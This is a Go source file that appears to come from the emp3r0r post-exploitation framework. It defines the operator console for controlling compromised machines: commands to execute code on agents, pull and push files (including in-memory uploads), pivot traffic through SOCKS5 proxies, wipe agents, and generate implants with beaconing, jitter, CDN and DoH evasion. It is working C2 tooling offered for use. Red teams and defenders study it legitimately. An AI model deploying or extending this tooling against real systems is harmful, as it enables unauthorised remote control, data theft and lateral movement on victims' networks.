package operator

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"text/template"

	"github.com/carapace-sh/carapace"
	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/agents"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/ftp"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/wireguard"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/builder"
	c2context "github.com/jm33-m0/emp3r0r/core/internal/cc/context"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/controllers"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/cli"
	"github.com/jm33-m0/emp3r0r/core/lib/gui"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/reeflective/console"
	"github.com/reeflective/console/commands/readline"
	"github.com/spf13/cobra"
	"github.com/spf13/pflag"
)

type Command struct {
	Name   string
	Help   string
	Func   any
	HasArg bool
}

// CommandMap holds all commands
func Emp3r0rCommands(app *console.Console) console.Commands {
	return func() *cobra.Command {
		rootCmd := &cobra.Command{}
		rootCmd.Use = "" // this is the root command
		rootCmd.Short = "Emp3r0r Console"
		rootCmd.Args = cobra.MinimumNArgs(1)
		rootCmd.DisableSuggestions = true

		rootCmd.AddGroup(
			&cobra.Group{ID: "core", Title: "Core Commands"},
			&cobra.Group{ID: "module", Title: "Module Commands"},
			&cobra.Group{ID: "filesystem", Title: "File system Commands"},
			&cobra.Group{ID: "network", Title: "Network Commands"},
			&cobra.Group{ID: "agent", Title: "Agent Commands"},
			&cobra.Group{ID: "c2", Title: "C2 commands"},
			&cobra.Group{ID: "job", Title: "Job commands"},
			&cobra.Group{ID: "util", Title: "Miscellaneous utilities"},
		)
		// add readline commands to configure the shell
		rootCmd.AddCommand(readline.Commands(app.Shell()))

		// Jobs command
		rootCmd.AddCommand(CmdJobs(app))

		exitCmd := &cobra.Command{
			Use:     "exit",
			Aliases: []string{"quit", "q", "bye", "logout", "shutdown", "stop"},
			GroupID: "core",
			Short:   "Exit emp3r0r",
			Args:    cobra.NoArgs,
			Run: func(cmd *cobra.Command, args []string) {
				exitEmp3r0r(app)
			},
		}
		rootCmd.AddCommand(exitCmd)

		resumeCmd := &cobra.Command{
			Use:     "resume",
			GroupID: "core",
			Short:   "Reactivate the operator after idle timeout",
			Long:    "Clear the server-side operator idle state so agents can reconnect. Use this if agents were disconnected due to operator idle timeout.",
			Args:    cobra.NoArgs,
			Run: func(cmd *cobra.Command, args []string) {
				if err := client.ResumeOperator(); err != nil {
					logging.Errorf("Failed to resume operator: %v", err)
					return
				}
				logging.Successf("Operator resumed. Agents may reconnect.")
				safeRefreshAgentList()
			},
		}
		rootCmd.AddCommand(resumeCmd)

		// this command will be used to generate an agent binary
		rootCmd.AddCommand(gen_agent_cmd())

		setDebuglevelCmd := &cobra.Command{
			Use:     "debug",
			GroupID: "core",
			Short:   "Set debug level: 0 (least verbose) to 3 (most verbose), default is 2 (info)",
			Example: "debug --level 3",
			Run:     logging.CmdSetDebugLevel,
		}
		setDebuglevelCmd.Flags().IntP("level", "l", -1, "Debug level")
		setDebuglevelCmd.MarkFlagRequired("level")
		rootCmd.AddCommand(setDebuglevelCmd)
		carapace.Gen(setDebuglevelCmd).FlagCompletion(carapace.ActionMap{
			"level": carapace.ActionValues("0", "1", "2", "3"),
		})

		addModuleCommands(rootCmd)

		targetCmd := &cobra.Command{
			Use:     "target (agent_id | agent_tag)",
			GroupID: "agent",
			Short:   "Set active target",
			Example: "target 0",
			Args:    cobra.ExactArgs(1),
			Run:     CmdSetActiveAgent,
		}
		rootCmd.AddCommand(targetCmd)
		carapace.Gen(targetCmd).PositionalCompletion(carapace.ActionCallback(listAgents))

		upgradeAgentCmd := &cobra.Command{
			Use:     "upgrade_agent",
			GroupID: "agent",
			Short:   "Upgrade agent on selected target, put agent binary in /tmp/emp3r0r/www/agent first",
			Run: func(cmd *cobra.Command, args []string) {
				logging.Errorf("Not implemented yet")
			},
			Args: cobra.NoArgs,
		}
		rootCmd.AddCommand(upgradeAgentCmd)

		lsCmd := &cobra.Command{
			Use:     "ls [dir]",
			GroupID: "filesystem",
			Short:   "List a directory of selected agent, without argument it lists current directory",
			Example: "ls /tmp\nls mem:///",
			Args:    cobra.MaximumNArgs(1),
			Run:     CmdLs,
		}
		rootCmd.AddCommand(lsCmd)
		carapace.Gen(lsCmd).PositionalCompletion(carapace.ActionMultiParts("/", listRemoteDir))

		cdCmd := &cobra.Command{
			Use:     "cd dir",
			GroupID: "filesystem",
			Short:   "Change current working directory of selected agent",
			Args:    cobra.ExactArgs(1),
			Run:     CmdCd,
		}
		rootCmd.AddCommand(cdCmd)
		carapace.Gen(cdCmd).PositionalCompletion(carapace.ActionMultiParts("/", listRemoteDir))

		cpCmd := &cobra.Command{
			Use:     "cp src dst",
			GroupID: "filesystem",
			Short:   "Copy a file to another location on selected target",
			Example: "cp /tmp/1.txt /tmp/2.txt",
			Args:    cobra.ExactArgs(2),
			Run:     CmdCp,
		}
		rootCmd.AddCommand(cpCmd)
		carapace.Gen(cpCmd).PositionalCompletion(carapace.ActionMultiParts("/", listRemoteDir),
			carapace.ActionMultiParts("/", listRemoteDir))

		mvCmd := &cobra.Command{
			Use:     "mv src dst",
			GroupID: "filesystem",
			Short:   "Move a file to another location on selected target",
			Example: "mv /tmp/1.txt /tmp/2.txt",
			Args:    cobra.ExactArgs(2),
			Run:     CmdMv,
		}
		rootCmd.AddCommand(mvCmd)
		carapace.Gen(mvCmd).PositionalCompletion(carapace.ActionMultiParts("/", listRemoteDir),
			carapace.ActionMultiParts("/", listRemoteDir))

		rmCmd := &cobra.Command{
			Use:     "rm file",
			GroupID: "filesystem",
			Short:   "Delete a file/directory on selected agent",
			Example: "rm /tmp/1.txt",
			Args:    cobra.ExactArgs(1),
			Run:     CmdRm,
		}
		rootCmd.AddCommand(rmCmd)
		carapace.Gen(rmCmd).PositionalCompletion(carapace.ActionMultiParts("/", listRemoteDir))

		catCmd := &cobra.Command{
			Use:     "cat file",
			GroupID: "filesystem",
			Short:   "Print file content on selected agent",
			Example: "cat /tmp/file",
			Args:    cobra.ExactArgs(1),
			Run:     CmdCat,
		}
		rootCmd.AddCommand(catCmd)
		carapace.Gen(catCmd).PositionalCompletion(carapace.ActionMultiParts("/", listRemoteDir))

		mkdirCmd := &cobra.Command{
			Use:     "mkdir dir",
			GroupID: "filesystem",
			Short:   "Create new directory on selected agent",
			Example: "mkdir /tmp/newdir",
			Args:    cobra.ExactArgs(1),
			Run:     CmdMkdir,
		}
		rootCmd.AddCommand(mkdirCmd)
		carapace.Gen(mkdirCmd).PositionalCompletion(carapace.ActionMultiParts("", listRemoteDir))

		pwdCmd := &cobra.Command{
			Use:     "pwd",
			GroupID: "filesystem",
			Short:   "Current working directory of selected agent",
			Args:    cobra.NoArgs,
			Run:     CmdPwd,
		}
		rootCmd.AddCommand(pwdCmd)

		psCmd := &cobra.Command{
			Use:     "ps",
			GroupID: "filesystem",
			Short:   "Process list of selected agent",
			Run:     CmdPs,
		}
		psCmd.Flags().IntP("pid", "p", 0, "Filter by PID")
		psCmd.Flags().StringP("user", "u", "", "Filter by user name")
		psCmd.Flags().StringP("name", "n", "", "Filter by command name (without arguments)")
		psCmd.Flags().StringP("cmdline", "c", "", "Filter by command line")
		rootCmd.AddCommand(psCmd)

		netHelperCmd := &cobra.Command{
			Use:     "net_helper",
			GroupID: "network",
			Short:   "Network helper: ip addr, ip route, ip neigh",
			Args:    cobra.NoArgs,
			Run:     CmdNetHelper,
		}
		rootCmd.AddCommand(netHelperCmd)

		killCmd := &cobra.Command{
			Use:     "kill pid [pid...]",
			GroupID: "util",
			Short:   "Terminate a process on selected agent",
			Example: "kill 1234 5678",
			Args:    cobra.MinimumNArgs(1),
			Run:     CmdKill,
		}
		rootCmd.AddCommand(killCmd)

		resetLayoutCmd := &cobra.Command{
			Use:     "reset_layout",
			GroupID: "util",
			Short:   "Reset tmux pane layout to default proportions",
			Args:    cobra.NoArgs,
			Run:     CmdResetLayout,
		}
		rootCmd.AddCommand(resetLayoutCmd)

		getCmd := &cobra.Command{
			Use:     "get [--recursive] [--regex regex_str] --path /path/to/file",
			GroupID: "filesystem",
			Short:   "Download a file from selected agent",
			Example: "get [--recursive] [--regex '*.pdf'] --path /tmp/1.txt",
			Run: func(cmd *cobra.Command, args []string) {
				target := agents.MustGetActiveAgent()
				if target == nil {
					logging.Errorf("No active agent")
					return
				}

				filePath, _ := cmd.Flags().GetString("path")
				isRecursive, _ := cmd.Flags().GetBool("recursive")
				filter, _ := cmd.Flags().GetString("regex")

				go func() {
					err := ftp.DownloadFromAgent(target, filePath, isRecursive, filter)
					if err != nil {
						logging.Errorf("Download failed: %v", err)
					}
				}()
			},
		}
		getCmd.Flags().BoolP("recursive", "r", false, "Download recursively")
		getCmd.Flags().StringP("path", "f", "", "Path to download")
		getCmd.Flags().StringP("regex", "e", "", "Regex to match files")
		getCmd.MarkFlagRequired("path")
		rootCmd.AddCommand(getCmd)
		carapace.Gen(getCmd).FlagCompletion(carapace.ActionMap{
			"path": carapace.ActionMultiParts("/", listRemoteDir),
		})

		putCmd := &cobra.Command{
			Use:     "put --src /path/to/local_file --dst /path/to/remote_file",
			GroupID: "filesystem",
			Short:   "Upload a file to selected agent. Supports mem:///path/to/file paths.",
			Example: "put --src /tmp/1.txt --dst /tmp/2.txt\nput --src /tmp/loader.so --dst mem:///tmp/loader.so",
			Run: func(cmd *cobra.Command, args []string) {
				target := agents.MustGetActiveAgent()
				if target == nil {
					logging.Errorf("No active agent")
					return
				}

				src, _ := cmd.Flags().GetString("src")
				dst, _ := cmd.Flags().GetString("dst")
				saveToMem, _ := cmd.Flags().GetBool("mem")

				go func() {
					err := ftp.UploadToAgent(src, dst, target, saveToMem)
					if err != nil {
						logging.Errorf("Upload failed: %v", err)
					}
				}()
			},
		}
		putCmd.Flags().StringP("src", "s", "", "Local source file path")
		putCmd.Flags().StringP("dst", "d", "", "Destination file path (mem:///path/to/file will save to memory)")
		putCmd.Flags().BoolP("mem", "m", false, "Save to memory on agent (optional if dst is mem:///path/to/file)")
		putCmd.MarkFlagRequired("src")
		putCmd.MarkFlagRequired("dst")
		rootCmd.AddCommand(putCmd)
		carapace.Gen(putCmd).FlagCompletion(carapace.ActionMap{
			"src": carapace.ActionFiles(),
			"dst": carapace.ActionMultiParts("/", listRemoteDir),
		})

		decryptCmd := &cobra.Command{
			Use:     "decrypt --path /path/to/file [--out /path/to/plaintext]",
			GroupID: "filesystem",
			Short:   "Decrypt a file on the agent and save it to disk (default: <path>.dec)",
			Run: func(cmd *cobra.Command, args []string) {
				path, _ := cmd.Flags().GetString("path")
				out, _ := cmd.Flags().GetString("out")
				cmdStr := fmt.Sprintf("decrypt --path '%s'", path)
				if out != "" {
					cmdStr += fmt.Sprintf(" --out '%s'", out)
				}
				logging.Warningf("OPSEC: decrypt writes plaintext files to agent's disk")
				executeCmd(cmdStr) // Helper to send command
			},
		}
		decryptCmd.Flags().StringP("path", "p", "", "File path to decrypt")
		decryptCmd.Flags().StringP("out", "o", "", "Output path for plaintext file")
		decryptCmd.MarkFlagRequired("path")
		rootCmd.AddCommand(decryptCmd)
		carapace.Gen(decryptCmd).FlagCompletion(carapace.ActionMap{
			"path": carapace.ActionMultiParts("/", listRemoteDir),
			"out":  carapace.ActionMultiParts("/", listRemoteDir),
		})

		suicideCmd := &cobra.Command{
			Use:     "suicide",
			GroupID: "agent",
			Short:   "Kill agent process, delete agent root directory",
			Run:     CmdSuicide,
		}
		rootCmd.AddCommand(suicideCmd)

		lsModCmd := &cobra.Command{
			Use:     "ls_modules",
			GroupID: "module",
			Short:   "List all modules",
			Args:    cobra.NoArgs,
			Run:     cmdListModules,
		}
		rootCmd.AddCommand(lsModCmd)

		lsTargetCmd := &cobra.Command{
			Use:     "ls_targets",
			GroupID: "agent",
			Short:   "List connected agents",
			Args:    cobra.NoArgs,
			Run:     CmdListAgents,
		}
		rootCmd.AddCommand(lsTargetCmd)

		searchCmd := &cobra.Command{
			Use:     "search module",
			GroupID: "module",
			Short:   "Search for a module",
			Example: "search shell",
			Args:    cobra.ExactArgs(1),
			Run:     cmdSearchModule,
		}
		rootCmd.AddCommand(searchCmd)

		labelAgentCmd := &cobra.Command{
			Use:     "label --id agent_id --label custom_name",
			GroupID: "agent",
			Short:   "Label an agent with custom name",
			Example: "label --id <agent_id> --label <custom_name>",
			Run: func(cmd *cobra.Command, args []string) {
				agentID, _ := cmd.Flags().GetString("id")
				label, _ := cmd.Flags().GetString("label")

				err := agents.SetAgentLabel(agentID, label)
				if err != nil {
					logging.Errorf("Set agent label: %v", err)
					return
				}
			},
		}
		labelAgentCmd.Flags().StringP("id", "", "0", "Agent ID")
		labelAgentCmd.Flags().StringP("label", "", "no-label", "Custom name")
		labelAgentCmd.MarkFlagRequired("id")
		labelAgentCmd.MarkFlagRequired("label")
		rootCmd.AddCommand(labelAgentCmd)
		carapace.Gen(labelAgentCmd).FlagCompletion(carapace.ActionMap{
			"id":    carapace.ActionCallback(listAgents),
			"label": carapace.ActionValues("no-label", "linux", "windows", "workstation", "server", "dev", "prod", "test", "honeypot"),
		})

		execCmd := &cobra.Command{
			Use:     "exec --cmd 'command'",
			GroupID: "util",
			Short:   "Execute a command on selected agent",
			Example: "exec --cmd 'ls -la'",
			Run:     execCmd,
		}
		execCmd.Flags().StringP("cmd", "c", "", "Command to execute on agent")
		execCmd.MarkFlagRequired("cmd")

		rootCmd.AddCommand(execCmd)
		carapace.Gen(execCmd).FlagCompletion(carapace.ActionMap{
			"cmd": carapace.ActionCallback(listAgentExes),
		})

		forgetAgentCmd := &cobra.Command{
			Use:     "forget_agent <uuid>",
			GroupID: "c2",
			Short:   "Remove an agent from the database (tracking history)",
			Example: "forget_agent <agent-uuid>",
			Args:    cobra.ExactArgs(1),
			Run:     CmdForgetAgent,
		}
		rootCmd.AddCommand(forgetAgentCmd)
		carapace.Gen(forgetAgentCmd).PositionalCompletion(carapace.ActionCallback(listAgents))

		socksStartCmd := &cobra.Command{
			Use:     "socks_start [port]",
			GroupID: "c2",
			Short:   "Start a SOCKS5 pivot on the C2, relaying through the selected agent",
			Example: "socks_start 1080\n\tproxychains: socks5 <C2 WireGuard IP> 1080",
			Args:    cobra.MaximumNArgs(1),
			Run:     socks5StartCmdRun,
		}
		socksStartCmd.Flags().StringP("bind", "b", "", "C2 bind address (default: all interfaces, e.g. reachable via the WireGuard IP)")
		rootCmd.AddCommand(socksStartCmd)

		socksStopCmd := &cobra.Command{
			Use:     "socks_stop <port>",
			GroupID: "c2",
			Short:   "Stop a SOCKS5 pivot on the C2",
			Example: "socks_stop 1080",
			Args:    cobra.ExactArgs(1),
			Run:     socks5StopCmdRun,
		}
		rootCmd.AddCommand(socksStopCmd)

		socksStatusCmd := &cobra.Command{
			Use:     "socks_status",
			GroupID: "c2",
			Short:   "Show running SOCKS5 pivots on the C2",
			Args:    cobra.NoArgs,
			Run:     socks5StatusCmdRun,
		}
		rootCmd.AddCommand(socksStatusCmd)

		// sing-tun based transparent proxy (operator side)
		rootCmd.AddCommand(buildTun2SocksCommand())

		return rootCmd
	}
}

func socks5StartCmdRun(cmd *cobra.Command, args []string) {
	port := 1080
	if len(args) > 0 {
		p, err := strconv.Atoi(args[0])
		if err != nil || p <= 0 || p > 65535 {
			logging.Errorf("Invalid port: %s", args[0])
			return
		}
		port = p
	}
	bind, _ := cmd.Flags().GetString("bind")
	agent := agents.MustGetActiveAgent()
	if agent == nil {
		logging.Errorf("No active agent selected (use `target <id>` first)")
		return
	}
	if err := client.StartSocks5Proxy(agent.Tag, port, bind); err != nil {
		logging.Errorf("socks_start: %v", err)
		return
	}
	proxyAddr := socks5ProxyHost()
	if bind != "" && bind != "0.0.0.0" {
		proxyAddr = bind
	}
	logging.Successf("SOCKS5 pivot on %s:%d via agent %s", proxyAddr, port, agent.Tag)
	logging.Warningf("proxychains config: socks5 %s %d", proxyAddr, port)
}

// socks5ProxyHost returns the address the operator should reach the C2-side
// SOCKS5 listener at. It is auto-populated: when the console runs on the same
// host as the C2 (local mode) it is 127.0.0.1; otherwise it is the WireGuard
// server IP the operator connected through (set from --server-wg-ip), so proxy
// traffic stays inside the WireGuard tunnel.
func socks5ProxyHost() string {
	if ServerIP == "" || ServerIP == "127.0.0.1" || ServerIP == "localhost" {
		return "127.0.0.1"
	}
	return wireguard.WgServerIP
}

func socks5StopCmdRun(cmd *cobra.Command, args []string) {
	port, err := strconv.Atoi(args[0])
	if err != nil {
		logging.Errorf("Invalid port: %s", args[0])
		return
	}
	if err := client.StopSocks5Proxy(port); err != nil {
		logging.Errorf("socks_stop: %v", err)
		return
	}
	logging.Successf("SOCKS5 pivot on port %d stopped", port)
}

func socks5StatusCmdRun(cmd *cobra.Command, _ []string) {
	proxies, err := client.ListSocks5Proxies()
	if err != nil {
		logging.Errorf("socks_status: %v", err)
		return
	}
	if len(proxies) == 0 {
		logging.Infof("No SOCKS5 pivot is running on the C2")
		return
	}
	for _, p := range proxies {
		bind := p.BindAddr
		if bind == "" || bind == "0.0.0.0" {
			bind = "0.0.0.0 (any interface)"
		}
		logging.Infof("SOCKS5 pivot on %s:%d via agent %s", bind, p.Port, p.AgentTag)
	}
	logging.Infof("Reach it at socks5 %s <port> (tun2socks picks it up automatically)", socks5ProxyHost())
}

func execCmd(cmd *cobra.Command, args []string) {
	// get command to execute
	cmdStr, err := cmd.Flags().GetString("cmd")
	if err != nil {
		logging.Errorf("Error getting command: %v", err)
		return
	}
	if cmdStr == "" {
		logging.Errorf("No command specified")
		return
	}

	agent := agents.MustGetActiveAgent()
	if agent == nil {
		logging.Errorf("No active agent")
		return
	}

	// execute command
	ctx := &c2context.C2Context{
		Target:    agent,
		OpSession: client.SessionID,
		Flags:     make(map[string]string),
	}
	ctx.Flags["cmd_to_exec"] = fmt.Sprintf("exec --cmd %s", strconv.Quote(cmdStr))
	logging.Warningf("OPSEC: exec recorded as fork and run (High OPSEC Risk)")
	controllers.ExecuteRawCommand(ctx)
}

func exitEmp3r0r(_ *console.Console) {
	logging.Warningf("Exiting emp3r0r... Goodbye!")
	if common.RuntimeConfig.PreflightEnabled {
		logging.Warningf("Remember to remove the conditional C2 preflight URL from your server or agents will make too much noise: %s",
			common.RuntimeConfig.PreflightURL)
	}
	if GuiMode {
		// leaving on purpose (Exit button / `exit`): lib/gui logs synchronously,
		// forgets the saved session, tears the GUI down and exits the process.
		gui.ExitProcess()
	}
	cli.TmuxDeinitWindows()
	os.Exit(0)
}

func gen_agent_cmd() *cobra.Command {
	genAgentCmd := &cobra.Command{
		Use:     "generate",
		GroupID: "agent",
		Short:   "Generate an agent binary or implant",
		Example: "generate --type linux_executable --arch amd64",
		Run:     CmdGenerateAgent,
	}

	// Helper to add flags to groups
	addFlagToGroup := func(group string, flags ...string) {
		for _, f := range flags {
			genAgentCmd.Flags().Lookup(f).Annotations = map[string][]string{"group": {group}}
		}
	}

	// Group 1: Payload & Target
	genAgentCmd.Flags().StringP("type", "t", builder.PayloadTypeLinuxSO, fmt.Sprintf("Payload type, available: %v+ (linux_so and windows_dll support CGO)", builder.PayloadTypeList))
	genAgentCmd.Flags().StringP("arch", "a", "amd64", fmt.Sprintf("Target architecture, available: %v+", builder.ArchListAll))
	addFlagToGroup("Payload & Target Options", "type", "arch")

	// Group 2: C2 Connectivity & Transport
	cc_hosts := transport.NamesInCert(transport.ServerCrtFile)
	default_cc := live.RuntimeConfig.CCAddress
	if default_cc == "127.0.0.1" || default_cc == "localhost" {
		default_cc = ""
	}
	if default_cc == "" {
		for _, h := range cc_hosts {
			if h != "127.0.0.1" && h != "localhost" {
				default_cc = h
				break
			}
		}
	}

	genAgentCmd.Flags().StringP("cc", "", default_cc, "C2 server address (Required)")
	genAgentCmd.Flags().StringP("c2-channel-mode", "", def.C2ChannelModeDefault, fmt.Sprintf("C2 channel wrapper mode. Available: %s", strings.Join(transport.AllC2ChannelModesDetailed(), ";")))
	genAgentCmd.Flags().StringP("cc-http-port", "", live.RuntimeConfig.CCHTTPPort, "Port for HTTP Polling/Beaconing C2 transport")
	genAgentCmd.Flags().StringP("proxy", "", "", "Hard coded proxy URL for agent's C2 transport. Example: socks5://127.0.0.1:9050")
	genAgentCmd.Flags().StringP("cdn", "", "", "CDN proxy to reach C2. Example: wss://cdn.example.com/ws")
	genAgentCmd.Flags().StringP("doh", "", "", "DNS over HTTPS server to use for DNS resolution. Example: https://1.1.1.1/dns-query")
	genAgentCmd.Flags().BoolP("kcp", "", false, "Use KCP (secure UDP multiplexed tunnel)")
	addFlagToGroup("C2 Transport Options", "cc", "c2-channel-mode", "cc-http-port", "proxy", "cdn", "doh", "kcp")

	// Group 3: Beaconing (Polling/Beaconing Mode Only)
	genAgentCmd.Flags().IntP("interval", "i", 60, "C2 beacon interval in seconds")
	genAgentCmd.Flags().IntP("jitter", "j", 20, "C2 beacon jitter percentage (0-100)")
	addFlagToGroup("Beaconing Options (HTTP Mode)", "interval", "jitter")

	// Group 4: Mesh / P2P
	genAgentCmd.Flags().BoolP("p2p", "", false, "Enable P2P mesh networking")
	genAgentCmd.Flags().StringP("p2p-transport", "", "mtls", "Transport type for P2P mesh connections")
	genAgentCmd.Flags().StringP("p2p-relay-port", "", "", "Custom P2P relay port (default: auto-generate unique port)")
	genAgentCmd.Flags().StringP("mesh-gossip-port", "", "", "Custom mesh gossip port (default: auto-generate unique port)")
	genAgentCmd.Flags().BoolP("direct-c2", "", false, "Gateway mode: contacts C2 directly AND relays for Silent Nodes")
	genAgentCmd.Flags().BoolP("persistent-router", "", false, "Keep the current router while it is alive")
	genAgentCmd.Flags().StringSliceP("peers", "", nil, "Gossip bootstrap peers in ip:port format. Example: --peers 1.2.3.4:7946")
	addFlagToGroup("Mesh networking (P2P) Options", "p2p", "p2p-transport", "p2p-relay-port", "mesh-gossip-port", "direct-c2", "persistent-router", "peers")

	// Group 5: Stealth & Connectivity
	genAgentCmd.Flags().BoolP("stager", "", false, "Built for stager (enables memory encryption and suspension)")
	genAgentCmd.Flags().BoolP("NCSI", "", false, "Use NCSI to check for Internet connectivity before connecting to C2")
	genAgentCmd.Flags().IntP("operator-idle-timeout", "", 1800, "Operator idle timeout in seconds before C2 refuses agent connections (0 disables idle timeout)")
	addFlagToGroup("Stealth & Connectivity Options", "stager", "NCSI", "operator-idle-timeout")

	// Force user to specify CC address
	genAgentCmd.MarkFlagRequired("cc")

	// Help Template for flag grouping
	genAgentCmd.SetHelpTemplate(`{{.Short}}

Usage:
  {{.CommandPath}} [flags]

{{range .Groups}}
{{.Title}}:
{{.Flags}}{{end}}
Example:
  {{.Example}}
`)

	// help / usage categories
	groups := []string{
		"Payload & Target Options",
		"C2 Transport Options",
		"Beaconing Options (HTTP Mode)",
		"Mesh networking (P2P) Options",
		"Stealth & Connectivity Options",
	}

	// help and usage functions
	type flagGroup struct {
		Title string
		Flags string
	}
	renderHelp := func(cmd *cobra.Command) {
		var groupData []flagGroup
		for _, g := range groups {
			fset := &pflag.FlagSet{}
			cmd.Flags().VisitAll(func(f *pflag.Flag) {
				if f.Annotations["group"] != nil && f.Annotations["group"][0] == g {
					fset.AddFlag(f)
				}
			})
			if fset.HasFlags() {
				groupData = append(groupData, flagGroup{
					Title: g,
					Flags: fset.FlagUsages(),
				})
			}
		}

		// miscellaneous flags
		fset := &pflag.FlagSet{}
		cmd.Flags().VisitAll(func(f *pflag.Flag) {
			hasGroup := false
			for _, g := range groups {
				if f.Annotations["group"] != nil && f.Annotations["group"][0] == g {
					hasGroup = true
					break
				}
			}
			if !hasGroup {
				fset.AddFlag(f)
			}
		})
		if fset.HasFlags() {
			groupData = append(groupData, flagGroup{
				Title: "Miscellaneous Options",
				Flags: fset.FlagUsages(),
			})
		}

		// render the template
		t := template.Must(template.New("help").Parse(cmd.HelpTemplate()))
		err := t.Execute(cmd.OutOrStdout(), struct {
			*cobra.Command
			Groups []flagGroup
		}{
			Command: cmd,
			Groups:  groupData,
		})
		if err != nil {
			logging.Errorf("render help: %v", err)
		}
	}

	genAgentCmd.SetHelpFunc(func(cmd *cobra.Command, args []string) {
		renderHelp(cmd)
	})
	genAgentCmd.SetUsageFunc(func(cmd *cobra.Command) error {
		renderHelp(cmd)
		return nil
	})

	// completers
	carapace.Gen(genAgentCmd).FlagCompletion(carapace.ActionMap{
		"type":            carapace.ActionValues(builder.PayloadTypeList...),
		"arch":            carapace.ActionValues(builder.ArchListAll...),
		"cc":              carapace.ActionValues(cc_hosts...),
		"cdn":             carapace.ActionValues("wss://", "ws://"),
		"doh":             carapace.ActionValues("https://1.1.1.1/dns-query", "https://8.8.8.8/dns-query", "https://9.9.9.9/dns-query"),
		"proxy":           carapace.ActionValues("socks5://127.0.0.1:9050", "socks5://"),
		"c2-channel-mode": carapace.ActionValues(transport.AllC2ChannelModes()...),
		"p2p-transport":   carapace.ActionValues(transport.AllTransportNames()...),
	})
	return genAgentCmd
}
